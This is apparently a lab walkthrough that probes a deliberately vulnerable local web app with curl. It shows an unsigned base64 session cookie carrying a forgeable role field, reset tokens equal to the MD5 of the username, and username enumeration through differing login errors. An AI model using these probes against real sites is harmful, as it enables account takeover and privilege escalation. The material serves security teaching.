# Finding the Bug

## Inspect the session cookie

Log in as alice and look at the response headers:

```bash
curl -sv http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' 2>&1 | grep -i set-cookie
```

```
< Set-Cookie: session=eyJ1c2VybmFtZSI6ICJhbGljZSIsICJyb2xlIjogInVzZXIifQ==; Path=/
```

Decode it:

```bash
echo "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJyb2xlIjogInVzZXIifQ==" | base64 -d
```

```
{"username": "alice", "role": "user"}
```

The cookie is plain JSON in base64. There is no signature. The `role` field is set by the server when alice logs in, but nothing prevents you from encoding a different value and sending it back.

## Check the admin endpoint

Try accessing the admin panel with alice's cookie:

```bash
SESSION=$(curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' \
  -D - | grep -i set-cookie | grep -oP 'session=\K[^;]+')

curl -s http://127.0.0.1:5000/api/admin --cookie "session=$SESSION"
```

```json
{"error": "admin only"}
```

The endpoint blocks alice because her cookie says `role: user`. The check is on the cookie contents, not on a server-side session record.

## Probe the reset endpoint

Request a reset token for bob:

```bash
curl -s http://127.0.0.1:5000/api/reset \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob"}'
```

```json
{"message": "reset token issued", "token": "9f9d51bc70ef21ca5c14f307980a29d8"}
```

Compute MD5 of "bob" yourself:

```bash
python3 -c "import hashlib; print(hashlib.md5(b'bob').hexdigest())"
```

```
9f9d51bc70ef21ca5c14f307980a29d8
```

They match. The token is fully predictable. You do not need to control bob's email address to reset his password.

## Confirm username enumeration

Try logging in with a valid username but wrong password:

```bash
curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"wrong"}'
```

```json
{"error": "Incorrect password"}
```

Try a username that does not exist:

```bash
curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"nobody","password":"wrong"}'
```

```json
{"error": "Username not found"}
```

The two messages differ. This lets you enumerate valid usernames by observing which error you get.
